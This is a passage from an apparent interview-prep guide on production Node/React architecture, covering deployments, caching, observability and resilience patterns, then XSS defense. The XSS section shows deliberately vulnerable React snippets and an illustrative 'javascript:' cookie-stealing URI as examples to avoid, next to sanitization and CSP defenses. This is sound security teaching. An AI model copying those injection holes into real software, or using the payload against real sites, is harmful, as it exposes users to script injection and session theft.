                        │ (ALB / Nginx) │    WAF rules, rate limiting
                        └──────┬───────┘
                    ┌──────────┼──────────┐
                    ▼          ▼          ▼
              ┌─────────┐┌─────────┐┌─────────┐
              │ Node.js ││ Node.js ││ Node.js │  ← stateless instances
              │ (pod/EC2)││ (pod/EC2)││ (pod/EC2)│    (containers, ≥2 AZs)
              └────┬────┘└────┬────┘└────┬────┘
                   └──────────┼──────────┘
              ┌───────────────┼────────────────┐
              ▼               ▼                ▼
        ┌──────────┐   ┌────────────┐   ┌───────────┐
        │  Redis    │   │  MongoDB    │   │  Queue     │
        │ (sessions,│   │ Replica Set │   │ (BullMQ /  │
        │  cache,   │   │ (1 primary, │   │  SQS) +    │
        │  rate lim)│   │  2 second.) │   │  workers   │
        └──────────┘   └────────────┘   └───────────┘
```

**Key architectural decisions and why:**

**1. Serve React from a CDN, not from Express.**

```javascript
// BAD — Node serves static files; every JS/CSS request burns event-loop time
app.use(express.static('build'));

// GOOD — React build goes to S3+CloudFront / Vercel; Node serves ONLY /api
// index.html: Cache-Control: no-cache (so deploys are picked up)
// hashed assets (main.a3f9c2.js): Cache-Control: max-age=31536000, immutable
```

The frontend and backend now deploy and scale independently — a frontend hotfix doesn't touch the API fleet.

**2. Stateless app instances — the non-negotiable rule.**

Everything that must survive a request lives outside the process: sessions in Redis (or stateless JWTs), uploaded files in S3 (never local disk), rate-limit counters in Redis, scheduled jobs in a queue with a distributed lock (not `setInterval` in the app — with 3 instances it runs 3 times).

**3. Zero-downtime deploys.**

```text
Rolling deploy (default in Kubernetes / ECS):
  - Start new-version instance → wait for readiness probe → shift traffic
  - Drain old instance: stop accepting new connections, finish in-flight
    requests, then terminate

Graceful shutdown in Node — required for rolling deploys to be truly zero-downtime:
```

```javascript
const server = app.listen(PORT);

process.on('SIGTERM', async () => {
  // 1. Tell the LB to stop sending traffic (fail the readiness probe)
  healthy = false;
  // 2. Stop accepting new connections; let in-flight requests finish
  server.close(async () => {
    await mongoose.connection.close();  // 3. Release resources cleanly
    await redisClient.quit();
    process.exit(0);
  });
  // 4. Force-exit safety valve if draining hangs
  setTimeout(() => process.exit(1), 15_000).unref();
});
```

```text
Blue-green: two identical environments; flip the router/DNS between them.
  Instant rollback (flip back), but 2x infrastructure cost during deploy.

Canary: route 1% → 10% → 50% → 100% of traffic to the new version while
  watching error rate / latency dashboards. Safest for high-traffic systems;
  requires good observability to be meaningful.
```

**4. Environment & configuration:** secrets from a secrets manager (AWS Secrets Manager / Vault), not `.env` files in the image; identical Docker image promoted across dev → staging → prod (config changes, the artifact doesn't).

```dockerfile
# Multi-stage build — small, production-only image
FROM node:20-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build

FROM node:20-alpine
WORKDIR /app
ENV NODE_ENV=production
COPY package*.json ./
RUN npm ci --omit=dev
COPY --from=build /app/dist ./dist
USER node                     # never run as root
CMD ["node", "dist/server.js"]
```

#### Trade-offs

| Decision | Advantage | Disadvantage |
|---|---|---|
| CDN-hosted React + separate API | Independent deploys/scaling, edge caching, tiny API surface | CORS configuration required; two deploy pipelines to maintain |
| Kubernetes | Self-healing, rolling deploys, autoscaling built in | Significant operational complexity — overkill below a certain scale |
| ECS / Cloud Run / App Runner | Managed simplicity, less to operate | Less control, some vendor lock-in |
| Blue-green deploys | Instant rollback | Double infrastructure during deploys; DB migrations must be compatible with both versions |
| Canary deploys | Limits blast radius of a bad release | Needs mature metrics/alerting; slower rollout |

#### Common Mistakes

**1. In-memory session/state with multiple instances:**

```javascript
// BUG — login works, then randomly "logs out" when LB routes to another instance
const sessions = {};  // lives in ONE process only
// FIX — express-session with connect-redis store, or stateless JWT
```

**2. DB migrations coupled to the deploy (breaks rolling/blue-green):**

```text
During a rolling deploy, OLD and NEW code run simultaneously against the
same database. A migration that renames a column breaks the old version
instantly.

Rule: expand → migrate → contract.
  1. Deploy code that handles BOTH schemas (writes new field, reads either)
  2. Backfill/migrate data
  3. Deploy code that drops support for the old schema
  4. Remove the old column
```

**3. No health check distinction:**

```javascript
// Liveness: "is the process alive?" — restart the container if this fails
app.get('/healthz', (req, res) => res.sendStatus(200));

// Readiness: "can I serve traffic?" — remove from LB rotation if this fails
app.get('/readyz', async (req, res) => {
  const dbOk = mongoose.connection.readyState === 1;
  res.sendStatus(dbOk && healthy ? 200 : 503);
});
// Conflating them causes restart loops during a transient DB blip —
// the process is fine, it just can't serve; killing it makes things worse.
```

#### Follow-up Questions

1. How do you run a database migration during a zero-downtime deploy? *(expand/contract pattern above)*
2. Where do WebSocket connections complicate this architecture? *(sticky sessions or a Redis pub/sub adapter so any instance can deliver a message)*
3. What belongs in the CI pipeline before an image is allowed into production? *(lint, tests, `npm audit`, image scan, build once — promote the same artifact)*
4. How would you roll back a bad deploy that also included a data migration?
5. Why should `NODE_ENV=production` be set, concretely? *(Express disables verbose error pages and enables view caching; many libs skip dev-only checks — measurable perf difference)*

#### Real Production Example

An Atlassian-scale team ran a MERN app on 4 EC2 instances behind an ALB. Deploys used `pm2 restart` triggered over SSH on all instances simultaneously. Every deploy produced a ~20-second window of 502 errors: all four Node processes died at once, and in-flight requests were severed mid-response. Monitoring showed a spike of dropped checkout transactions correlated exactly with each release — deploys were quietly costing revenue.

**Fix applied:** Moved to rolling deploys (one instance at a time), implemented the SIGTERM graceful-shutdown handler above, and configured ALB connection draining (deregistration delay 30s) plus a readiness endpoint the deploy script polls before moving to the next instance. Deploy-time 5xx rate went to zero, and deploys stopped being scheduled at 2 AM "to be safe."

#### Performance Considerations

- Enable gzip/brotli at the CDN or Nginx layer, not in Node (`compression` middleware burns event-loop CPU)
- Keep-alive connections from LB to Node instances — connection setup per request is measurable at high QPS
- Set explicit `Cache-Control` on every API response, even if it's `no-store` — undefined caching behavior at CDN/proxy layers causes stale-data bugs

#### Scalability Considerations

- Autoscale on a leading indicator (event-loop lag, request latency, queue depth) rather than CPU alone — Node apps often fall over from event-loop saturation while CPU reads 40%
- MongoDB: replica set for HA first; sharding only when a single primary's write throughput or working set genuinely demands it — sharding prematurely is a common and expensive mistake
- Put slow work (email, PDF, image processing, webhooks) behind a queue from day one — it's the single cheapest architectural decision that prevents API latency from coupling to background workload

> **Interviewer Note:** A candidate who draws the full topology, explains graceful shutdown + rolling deploys, and knows the expand/contract migration pattern is Senior. Distinguishing liveness from readiness probes and autoscaling on event-loop lag is Staff-level.

---

### Q25 — Caching Strategy: CDN, Redis, and Cache Invalidation in Production

*Asked at: Amazon · Google · Uber · Walmart*

#### Why Interviewers Ask This

"There are only two hard things in computer science: cache invalidation and naming things." Interviewers ask this because caching is the highest-leverage performance tool in a production architecture, and also the source of the most confusing bugs (stale data, thundering herds, cache stampedes). They want to see you reason about *layers* of caching and, critically, how data leaves the cache — not just how it gets in.

#### Beginner Answer

> "I'd cache database results in Redis with a TTL so repeated requests don't hit MongoDB every time."

**Score: 3 / 10 — One layer, one pattern, no invalidation strategy, no failure modes**

#### Senior Engineer Answer

Caching exists at multiple layers, each with a different scope and invalidation story:

```text
Browser cache        → per-user, controlled by Cache-Control headers
CDN / edge cache     → global, static assets + cacheable API responses
API / Redis cache    → shared across instances, application-controlled
DB-internal caches   → MongoDB WiredTiger cache, connection pools (free, automatic)
```

**Cache-aside (lazy loading) — the default application pattern:**

```javascript
async function getProduct(id) {
  const cached = await redis.get(`product:${id}`);
  if (cached) return JSON.parse(cached);            // hit

  const product = await Product.findById(id).lean(); // miss → load from DB
  await redis.set(`product:${id}`, JSON.stringify(product), 'EX', 300); // TTL 5 min
  return product;
}
```

**Invalidation — the part that separates senior candidates:**

```javascript
// 1. TTL-only: simplest, bounded staleness. Right answer for most read-heavy data.

// 2. Explicit invalidation on write (delete, don't update):
async function updateProduct(id, changes) {
  const product = await Product.findByIdAndUpdate(id, changes, { new: true });
  await redis.del(`product:${id}`);   // next read repopulates from source of truth
  return product;
}
// DELETE beats SET on write: writing the new value to cache races with
// concurrent readers and can persist a stale/interleaved version.

// 3. Versioned keys for list/aggregate caches you can't enumerate:
//    product:list:v42 — bump the version counter on any write;
//    old keys expire naturally via TTL. Avoids scanning for keys to delete.
```

**Cache stampede (thundering herd) — the classic production incident:**

```text
A hot key expires → 5,000 concurrent requests all miss simultaneously →
all 5,000 hit MongoDB at once → DB saturates → latency spikes → retries
pile on → cascade.
```

```javascript
// Mitigation 1: per-key mutex — only ONE request recomputes, others wait
async function getWithLock(key, loader, ttl) {
  const cached = await redis.get(key);
  if (cached) return JSON.parse(cached);

  const gotLock = await redis.set(`lock:${key}`, '1', 'NX', 'EX', 10);
  if (gotLock) {
    const fresh = await loader();
    await redis.set(key, JSON.stringify(fresh), 'EX', ttl);
    await redis.del(`lock:${key}`);
    return fresh;
  }
  await new Promise(r => setTimeout(r, 100));  // brief wait, then re-check cache
  return getWithLock(key, loader, ttl);
}

// Mitigation 2: stale-while-revalidate — serve the stale value immediately,
// refresh in the background. Users see slightly old data, never a latency spike.

// Mitigation 3: TTL jitter — EX: 300 + Math.floor(Math.random() * 60)
// so a batch of keys written together doesn't expire together.
```

**HTTP-layer caching for APIs (often forgotten in MERN interviews):**

```javascript
// Public, personalized-free endpoints can be cached at the CDN:
res.set('Cache-Control', 'public, max-age=60, stale-while-revalidate=300');

// ETag/conditional requests — saves bandwidth and render time:
// Express sets ETags by default; client sends If-None-Match → 304 Not Modified
```

#### Trade-offs

| Pattern | Advantage | Disadvantage |
|---|---|---|
| Cache-aside + TTL | Simple, self-healing, bounded staleness | First request after expiry pays full latency; stampede risk on hot keys |
| Write-through | Cache always warm and consistent with writes | Write latency increases; cache churn for data never read |
| Explicit invalidation | Near-real-time freshness | Every write path must know every cache key it affects — easy to miss one |
| stale-while-revalidate | No user-facing latency cliff | Serves knowingly stale data for a window |
| CDN caching of API responses | Massive offload, global latency win | Cache poisoning risk if `Vary` headers are wrong; personalization impossible per-URL |

#### Common Mistakes

**1. Caching per-user data under a shared key:**

```javascript
// BUG — user A's cart served to user B
await redis.set('cart', JSON.stringify(cart));
// FIX — scope the key: `cart:${userId}`, and NEVER let the CDN cache
// authenticated responses without Vary/private: Cache-Control: private, no-store
```

**2. Treating Redis as durable storage:**

```text
Redis is a cache/ephemeral store. Eviction (maxmemory-policy allkeys-lru),
restarts, and failovers WILL lose keys. Anything you can't recompute from
the database doesn't belong only in Redis.
```

**3. Unbounded cache growth:**

```javascript
// No TTL + unique keys per query string = memory exhaustion
await redis.set(`search:${rawQueryString}`, results);  // millions of one-off keys
// FIX — always set TTL; normalize keys; configure maxmemory + eviction policy
```

#### Follow-up Questions

1. How would you cache a paginated, filterable product list? *(versioned keys or short TTL — enumerating every affected key on write is impractical)*
2. What is cache warming and when is it worth doing? *(pre-populating hot keys after deploy/flush to avoid a miss storm)*
3. Redis cluster vs. single instance — when do you need to shard the cache itself?
4. How do you keep cache consistency across microservices that share data? *(events/CDC to invalidate, or accept TTL-bounded staleness — strong consistency via shared cache is a trap)*
5. What happens to your API when Redis is down, and what should happen? *(degrade to DB with a circuit breaker + request coalescing — never hard-fail reads because the cache is unavailable)*

#### Real Production Example

At Walmart-scale, a product-detail API cached each product in Redis with a uniform 10-minute TTL, populated by a nightly batch that wrote all 200k keys in one pass. Every 10 minutes after the batch, hundreds of thousands of keys expired within the same few seconds, and morning traffic produced synchronized miss storms that drove MongoDB CPU to 95% in repeating 10-minute waves — a sawtooth latency pattern nobody could initially explain.

**Fix applied:** Added TTL jitter (600s ± 120s random) so expirations spread evenly, switched the top 1% hottest SKUs to stale-while-revalidate with background refresh, and added a per-key recompute lock. The sawtooth disappeared and MongoDB peak CPU dropped from 95% to 30%.

#### Performance Considerations

- Measure hit ratio per cache (target >90% for read-heavy endpoints) — a low-hit-ratio cache adds latency and complexity for nothing
- Use `redis.mget` / pipelining for multi-key reads — N sequential round-trips at ~0.5ms each add up fast on list endpoints
- Keep cached values small and flat; caching a 2MB aggregate blob to read one field wastes bandwidth and Redis memory — cache at the granularity you read

#### Scalability Considerations

- Redis single-threaded throughput (~100k ops/s) is usually enough; when it isn't, shard with Redis Cluster and design keys to avoid cross-slot operations
- Hot-key problem: one celebrity product hammering a single Redis shard — replicate that key to N suffixed copies (`product:123:{0..4}`) and read a random replica, or add a tiny in-process LRU (e.g., `lru-cache`, 1–5s TTL) in front of Redis for the very hottest keys
- Treat cache-layer failure as a designed-for scenario: circuit breaker around Redis, fall back to DB with concurrency limits, and load-test the "cache cold + Redis down" case before it happens at 2 AM

> **Interviewer Note:** A candidate who explains delete-vs-set on invalidation, names the stampede problem with a concrete mitigation, and designs for Redis being down is Senior/Staff level. TTL jitter and hot-key replication are the details that signal real production scars.

---

### Q26 — Observability: Logging, Metrics, Tracing, and Debugging Production Incidents

*Asked at: Google · Uber · Atlassian · Salesforce*

#### Why Interviewers Ask This

When production breaks at 2 AM, architecture diagrams don't answer "what is failing and why." This question tests whether you've actually operated a service: can you instrument it so the on-call engineer goes from alert to root cause in minutes? Interviewers listen for the three pillars (logs, metrics, traces), structured logging discipline, and what you alert on.

#### Beginner Answer

> "I'd use `console.log` for debugging and something like Winston to write logs to a file, plus maybe a monitoring dashboard."

**Score: 2 / 10 — console.log and log files don't survive containers, multiple instances, or any real incident**

#### Senior Engineer Answer

Observability has three pillars, each answering a different question:

```text
METRICS  → "Is something wrong?"        Aggregated numbers over time.
            RED per endpoint: Rate, Errors, Duration (p50/p95/p99)
            + Node-specific: event-loop lag, heap used, GC pauses, open handles

LOGS     → "What exactly happened?"     Structured events with context.

TRACES   → "Where in the chain?"        One request's journey across
            services: API → Mongo → Redis → payment gateway, with per-hop timing.
```

**Structured logging — machine-parseable, request-correlated:**

```javascript
// BAD — unsearchable string soup
console.log('Error processing order for user ' + userId);

// GOOD — structured JSON via pino (async, low-overhead)
const pino = require('pino');
const logger = pino({
  redact: ['req.headers.authorization', 'password', 'creditCard'], // never log secrets
});

logger.error({ orderId, userId, err, durationMs }, 'order processing failed');
// → queryable in any log aggregator: level=error orderId=... within 30s
```

**Request correlation with AsyncLocalStorage — the senior-level detail:**

```javascript
const { AsyncLocalStorage } = require('async_hooks');
const als = new AsyncLocalStorage();

app.use((req, res, next) => {
  const requestId = req.headers['x-request-id'] || crypto.randomUUID();
  res.set('x-request-id', requestId);
  als.run({ requestId, userId: req.user?.id }, next);
});

// Any log line, anywhere in the call stack, automatically carries the ID:
function logWithContext(obj, msg) {
  logger.info({ ...als.getStore(), ...obj }, msg);
}
// Now one requestId ties together every log line for a single request
// across the whole codebase — no manual threading of req through layers.
```

**Metrics with prom-client (Prometheus):**

```javascript
const client = require('prom-client');
client.collectDefaultMetrics(); // heap, event-loop lag, GC — free and essential

const httpDuration = new client.Histogram({
  name: 'http_request_duration_seconds',
  help: 'Request duration',
  labelNames: ['method', 'route', 'status'],
  buckets: [0.01, 0.05, 0.1, 0.3, 1, 3],
});

app.use((req, res, next) => {
  const end = httpDuration.startTimer();
  res.on('finish', () =>
    end({ method: req.method, route: req.route?.path ?? 'unmatched', status: res.statusCode }));
  next();
});

app.get('/metrics', async (req, res) => res.send(await client.register.metrics()));
```

> **Label cardinality warning:** label by route *pattern* (`/users/:id`), never raw URL (`/users/8231`) — unbounded label values blow up the metrics store.

**Distributed tracing:** instrument once with OpenTelemetry (auto-instruments Express, Mongoose, Redis, http) and export to Jaeger/Tempo/Datadog. The payoff: an on-call engineer sees "this slow request spent 1,800 of its 2,000ms inside the payment-gateway HTTP call" without reading any code.

**Alerting philosophy — alert on symptoms, not causes:**

```text
PAGE (wake someone up):    user-facing symptoms
  - Error rate > 1% for 5 min
  - p99 latency > 2s for 5 min
  - Health checks failing across multiple instances

TICKET (fix during work hours):  causes/capacity trends
  - Heap trending up over 24h (leak suspicion)
  - Disk 80%, cert expiring in 14 days
  - Queue depth growing steadily

Every page must be actionable. Alert fatigue — pages people learn to
ignore — is how real outages get missed.
```

#### Trade-offs

| Choice | Advantage | Disadvantage |
|---|---|---|
| Structured JSON logs | Searchable, aggregatable, machine-parseable | Slightly harder to eyeball locally (use pino-pretty in dev) |
| 100% trace sampling | Every request debuggable | Cost and overhead at scale — tail-based sampling (keep all errors + slow requests, 1% of the rest) is the mature answer |
| Vendor APM (Datadog/New Relic) | Fast setup, polished UX | Expensive at scale; some lock-in |
| OSS stack (Prometheus/Grafana/Loki/Tempo) | Cheap, portable, standard | You operate it; it becomes its own service to keep up |

#### Common Mistakes

**1. Logging inside hot loops / logging entire payloads:**

```javascript
// 10k RPS × full req.body serialized = event-loop burn + log storage bill
logger.info({ body: req.body }, 'incoming');  // also likely logs PII — compliance risk
// FIX — log identifiers and outcomes, not payloads; sample debug logs under load
```

**2. Averages instead of percentiles:**

```text
"Average latency 80ms" can hide a p99 of 4 seconds — 1% of your users
having an awful experience is invisible in the mean. Dashboards and SLOs
use p95/p99, always.
```

**3. No error tracking on unhandled failures:**

```javascript
process.on('unhandledRejection', (err) => {
  logger.fatal({ err }, 'unhandled rejection');
  // report to Sentry/error tracker, then exit — process state is suspect
  process.exit(1);  // let the orchestrator restart a clean instance
});
```

#### Follow-up Questions

1. How do you debug a slow endpoint when metrics say p99 is bad but you don't know why? *(exemplars/traces filtered to slow requests → find the slow span)*
2. How does a request ID propagate across microservices? *(traceparent header — W3C Trace Context — forwarded on every outbound call; OTel does this automatically)*
3. How would you detect a memory leak in production without restarting? *(heap trend metric → `v8.writeHeapSnapshot()` on a sidecar signal → compare snapshots)*
4. What are SLIs/SLOs and how do they change what you alert on? *(alert on error-budget burn rate, not raw thresholds)*
5. What's the observability cost model at 10k RPS — what do you sample vs. keep?

#### Real Production Example

At an Uber-scale service, checkout errors spiked to 3% but every dashboard was green — the team had per-instance CPU/memory graphs but no per-endpoint error metrics and unstructured logs scattered across 12 containers. Root-causing required SSH-ing into instances and grepping — it took 4 hours to discover a single downstream inventory service was timing out for one product category.

**Fix applied:** Instrumented RED metrics per route, structured logs with request IDs through AsyncLocalStorage, and OpenTelemetry tracing across the four services in the checkout path. The same class of incident three months later was diagnosed in 6 minutes from a single trace view showing the exact failing downstream span. MTTR is the metric that justifies observability spend.

#### Performance Considerations

- pino over winston for high-QPS services — pino defers serialization and writes asynchronously (~5x less overhead)
- Metrics collection is near-free; tracing at 100% sampling is not — use tail-based sampling at scale
- Never compute expensive log context (deep object serialization) eagerly at disabled log levels — check `logger.isLevelEnabled()` or rely on pino's lazy serializers

#### Scalability Considerations

- Logs from N containers must ship to a central aggregator (Loki, CloudWatch, ELK) via stdout + collector — never local files inside containers
- Trace context propagation must be standardized org-wide (W3C traceparent) — one team dropping headers breaks the whole trace
- Dashboards per service with a shared template (RED + saturation) so on-call engineers navigate any service's health the same way

> **Interviewer Note:** Request-ID correlation via AsyncLocalStorage, percentiles over averages, and symptom-based paging is Senior. Talking about error-budget burn-rate alerting and tail-based trace sampling is Staff/Principal.

---

### Q27 — Resilience Patterns: Timeouts, Retries, Circuit Breakers, and Graceful Degradation

*Asked at: Amazon · Google · Uber · Walmart*

#### Why Interviewers Ask This

Distributed systems fail partially: the database blips, a third-party API hangs, one microservice slows down. This question tests whether you design for those failures or merely hope. It's a favorite at Amazon ("everything fails all the time" — Werner Vogels) and is where cascade-failure war stories separate operators from feature developers.

#### Beginner Answer

> "I'd add try/catch around external calls and return a 500 with an error message if something fails."

**Score: 2 / 10 — Catching an error after 30 seconds of hanging is not resilience; no timeouts, retries, or isolation**

#### Senior Engineer Answer

The failure that kills Node services isn't errors — it's **slowness**. An erroring dependency fails fast; a hanging dependency ties up sockets, memory, and event-loop capacity until the whole service seizes. The pattern stack, in order of importance:

**1. Timeouts on every outbound call — non-negotiable:**

```javascript
// Node's default HTTP timeout is effectively unbounded. Never make an
// outbound call without a deadline.
const res = await fetch(url, { signal: AbortSignal.timeout(3000) });

// Mongoose:
await Product.find(query).maxTimeMS(2000);

// Connection pool acquisition too — a saturated pool hangs silently:
mongoose.connect(uri, { serverSelectionTimeoutMS: 5000, socketTimeoutMS: 10000 });
```

**2. Retries — with exponential backoff, jitter, and a budget:**

```javascript
async function withRetry(fn, { attempts = 3, baseMs = 100 } = {}) {
  for (let i = 0; i < attempts; i++) {
    try {
      return await fn();
    } catch (err) {
      const retryable = err.code === 'ECONNRESET' || err.status === 503 || err.status === 429;
      if (!retryable || i === attempts - 1) throw err;
      // Exponential backoff + FULL jitter — prevents synchronized retry storms
      const delay = Math.random() * baseMs * 2 ** i;
      await new Promise(r => setTimeout(r, delay));
    }
  }
}
```

```text
Retry rules interviewers listen for:
  - Only retry IDEMPOTENT operations (GET, PUT with idempotency keys).
    Retrying a non-idempotent POST /charge can double-charge a customer.
  - Only retry RETRYABLE errors (timeouts, 503, 429) — never 400/401/404.
  - Jitter is mandatory: without it, all clients retry in lockstep and
    re-kill the recovering service ("retry storm").
  - Retries multiply load: 3 retries × 3 services deep = 27x amplification
    at the bottom of the chain. Keep retry counts low and add budgets.
```

**3. Circuit breaker — stop hammering a dead dependency:**

```text
CLOSED (normal)  → requests flow; count failures in a rolling window
     │  failure rate > 50%
     ▼
OPEN             → fail IMMEDIATELY without calling the dependency
     │  after cooldown (e.g., 10s)                (fast failure + fallback)
     ▼
HALF-OPEN        → allow a few probe requests
     ├─ probes succeed → CLOSED
     └─ probes fail    → OPEN again
```

```javascript
const CircuitBreaker = require('opossum');

const breaker = new CircuitBreaker(callInventoryService, {
  timeout: 3000,                 // treat >3s as failure
  errorThresholdPercentage: 50,  // open at 50% failures
  resetTimeout: 10_000,          // try again after 10s
});
breaker.fallback(() => ({ available: null, degraded: true })); // serve degraded, not 500
breaker.on('open', () => logger.warn('inventory circuit OPEN'));

const stock = await breaker.fire(productId);
```

**4. Graceful degradation — decide per-dependency what "partially up" means:**

```text
For an e-commerce product page:
  Reviews service down      → show page without reviews        (degrade silently)
  Recommendations down      → hide the carousel                (degrade silently)
  Pricing service down      → CANNOT sell at unknown price     (fail the action,
                                                                not the whole page)
  Payment gateway down      → queue the order for retry, tell the user

The architecture decision is the CLASSIFICATION — which dependencies are
critical vs. optional — made deliberately, per endpoint, in advance.
```

**5. Bulkheads & backpressure — isolate and shed load:**

```javascript
// Bounded concurrency per dependency — one slow downstream can't consume
// every socket in the process:
const pLimit = require('p-limit');
const inventoryLimit = pLimit(50);           // max 50 in-flight calls
await inventoryLimit(() => breaker.fire(id));

// Load shedding — reject early when saturated instead of queueing to death:
const { monitorEventLoopDelay } = require('perf_hooks');
const h = monitorEventLoopDelay(); h.enable();
app.use((req, res, next) => {
  if (h.mean / 1e6 > 200) return res.status(503).set('Retry-After', '2').end();
  next();
});
// A fast 503 the client can retry beats a 30s hang that ties up both sides.
```

#### Trade-offs

| Pattern | Advantage | Disadvantage |
|---|---|---|
| Aggressive timeouts | Fails fast, frees resources | Too tight → false failures on legitimate slow ops (set from p99 + margin) |
| Retries | Rides out transient blips invisibly | Load amplification; dangerous on non-idempotent ops |
| Circuit breaker | Stops cascades, gives dependencies room to recover | Tuning thresholds is empirical; per-instance state (one pod's breaker opens, another's doesn't) |
| Load shedding | Protects the core service under overload | Deliberately dropping some users' requests — needs product buy-in |
| Fallbacks/degradation | Users see a working (if reduced) product | Silent degradation can mask real outages without alerting on fallback rate |

#### Common Mistakes

**1. Timeout hierarchy inverted:**

```text
If the client (or LB) times out at 30s but your downstream call allows 60s,
you keep computing results nobody will receive. Deadlines must SHRINK as
you go deeper: LB 30s → handler 10s → downstream call 3s → DB 2s.
```

**2. Retrying non-idempotent operations:**

```javascript
// Double-charge classic: the charge succeeded, only the RESPONSE was lost;
// the retry charges again.
await withRetry(() => paymentGateway.charge(card, amount));  // DANGER
// FIX — idempotency keys: gateway deduplicates by key server-side
await paymentGateway.charge(card, amount, { idempotencyKey: orderId });
```

**3. Unbounded connection pool + no queue timeout:**

```javascript
// When Mongo slows down, requests silently queue for a pool connection —
// no error, just seconds of invisible latency before the query even starts.
// Cap the pool and fail fast when acquisition takes too long:
mongoose.connect(uri, { maxPoolSize: 100, waitQueueTimeoutMS: 2000 });
```

#### Follow-up Questions

1. Where should the circuit breaker live — in each service instance, or a shared layer? *(usually per-instance in-process; service mesh (Istio/Envoy) centralizes it at the sidecar)*
2. How do idempotency keys work end-to-end for a payment flow?
3. What is a retry budget and why is per-request retry count insufficient at scale? *(cap total retries as a % of traffic to prevent amplification)*
4. How do you test resilience — describe chaos engineering in practice. *(fault injection in staging: kill dependencies, add latency, verify degradation paths actually work)*
5. How does backpressure propagate through a queue-based async pipeline?

#### Real Production Example

At a Walmart-scale storefront, a third-party reviews API began responding in 25–30 seconds instead of 200ms (their incident, not ours). The product-page handler awaited reviews with no timeout. Every page view held a socket and handler context for ~30s; within four minutes all Node instances hit their connection limits, and the entire storefront — including checkout, which never touched reviews — went down. A cosmetic dependency took out the revenue path.

**Fix applied:** 2-second timeout on the reviews call with an empty-reviews fallback, circuit breaker (opossum) so the flapping dependency was cut off entirely while broken, bounded per-dependency concurrency (p-limit), and a dashboard + alert on fallback-serving rate so degradation is visible, not silent. The same third-party incident recurred a month later: reviews section quietly disappeared for 40 minutes, checkout conversion unaffected, and nobody was paged at 2 AM.

#### Performance Considerations

- Timeouts should derive from measured p99 of the dependency plus margin — not round numbers picked in a meeting
- Circuit breakers add negligible overhead when closed; their value is entirely in the failure path
- Load shedding checks must be O(1) (read a pre-computed gauge) — an expensive "are we overloaded?" check adds to the overload

#### Scalability Considerations

- At microservice depth ≥3, unmanaged retries amplify catastrophically — adopt retry budgets and propagate deadlines (remaining-time header) down the call chain
- A service mesh (Envoy sidecars) standardizes timeouts/retries/breakers across services and languages without app-code changes — the org-scale answer to per-team inconsistency
- Run game days: deliberately break each dependency in staging quarterly and verify the degradation classification still matches reality — fallback paths rot silently because they never execute

> **Interviewer Note:** Timeouts-everywhere plus backoff-with-jitter is table stakes for Senior. Idempotency keys, retry budgets, deadline propagation, and the degraded-vs-critical dependency classification — told through a cascade-failure story — is Staff/Principal signal.

---

## Topic 04 — Web & Application Security

> Builds on Q23 (Node/API injection & JWT). Q23 covered server-side injection classes and API hardening; this topic covers the browser-facing attack surface (XSS, CSRF), the auth models themselves (sessions vs JWT, OAuth), access control (IDOR/BOLA), and transport/secrets. Every answer includes the explicit **trade-off** an interviewer is really probing for — there is no free security control.

---

### Q28 — XSS (Cross-Site Scripting): Stored vs Reflected vs DOM, and Why React Is Not a Free Pass

*Asked at: Google · Meta · Atlassian · Salesforce · Adobe*

#### Why Interviewers Ask This

XSS is still #1 or #2 on nearly every real-world bug bounty payout list. Interviewers ask it because most React developers believe "React escapes everything, so I'm safe" — which is dangerously wrong. They want to see if you know the three XSS types, the exact React escape hatches that reintroduce it, and the defense-in-depth layers (CSP, cookie flags, sanitization) with their trade-offs.

#### Beginner Answer

> "XSS is when someone injects JavaScript into your site. You prevent it by escaping user input, and React does that automatically."

**Score: 3 / 10 — Knows the definition, misses the taxonomy, the React escape hatches, CSP, and every trade-off**

#### Senior Engineer Answer

XSS = the browser executes attacker-controlled script **in the origin of your site**, giving it your users' cookies, localStorage, and DOM. Three delivery mechanisms:

```text
┌────────────────┬─────────────────────────────────────────────────────────┐
│ Stored (persistent) │ Payload saved in DB (comment, profile bio), served to  │
│                     │ every viewer. Highest impact — one injection, mass hit.│
├────────────────┼─────────────────────────────────────────────────────────┤
│ Reflected           │ Payload in the request (query param, URL), echoed back  │
│                     │ in the response unescaped. Needs a crafted link + a     │
│                     │ victim who clicks it.                                   │
├────────────────┼─────────────────────────────────────────────────────────┤
│ DOM-based           │ Never touches the server — client JS reads location.hash│
│                     │ /document.referrer and writes it into the DOM. Invisible│
│                     │ to server-side WAFs and logs.                           │
└────────────────┴─────────────────────────────────────────────────────────┘
```

**Where React actually bites you — the escape hatches:**

```jsx
// SAFE — React escapes text children by default. This renders as literal text:
<div>{userInput}</div>   // <script> becomes &lt;script&gt; — cannot execute

// VULNERABLE 1 — dangerouslySetInnerHTML bypasses all escaping
<div dangerouslySetInnerHTML={{ __html: userBio }} />  // stored XSS if userBio unsanitized

// VULNERABLE 2 — href/src with a javascript: URI
<a href={userProvidedUrl}>click</a>   // href="javascript:stealCookies()" executes on click

// VULNERABLE 3 — spreading unvalidated props
<div {...userControlledProps} />       // attacker sets dangerouslySetInnerHTML via props

// VULNERABLE 4 — injecting into non-React DOM (refs, third-party widgets)
ref.current.innerHTML = userInput;     // React's escaping never runs here
```

**Layer 1 — Sanitize when you MUST render HTML (rich text editors, CMS):**

```jsx
import DOMPurify from 'dompurify';

// Allow-list based sanitization — strips <script>, on* handlers, javascript: URIs
const clean = DOMPurify.sanitize(userBio, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href'],
});
<div dangerouslySetInnerHTML={{ __html: clean }} />
```

**Layer 2 — Content Security Policy (defense-in-depth, assumes a payload got through):**

```javascript
// A strict CSP means even an injected <script> won't execute — no inline, no eval
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'nonce-<per-request-random>'"], // nonce, NOT 'unsafe-inline'
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
  },
}));
// Report-only mode first, collect violations, then enforce:
// helmet.contentSecurityPolicy({ reportOnly: true, directives: { reportUri: '/csp-report' } })
```

**Layer 3 — Make token theft useless even if script runs:**

```javascript
// httpOnly cookie is invisible to document.cookie, so injected JS cannot exfiltrate it
res.cookie('session', sid, { httpOnly: true, secure: true, sameSite: 'strict' });
// This is WHY httpOnly matters: it turns a full account takeover into a limited-blast XSS
```

#### Trade-offs

| Control | Advantage | Disadvantage (the real cost) |
|---|---|---|
| Rely on React auto-escaping only | Zero effort, covers the 95% text-rendering case | Silent false confidence — `dangerouslySetInnerHTML`, `href`, refs, and SSR still bypass it |
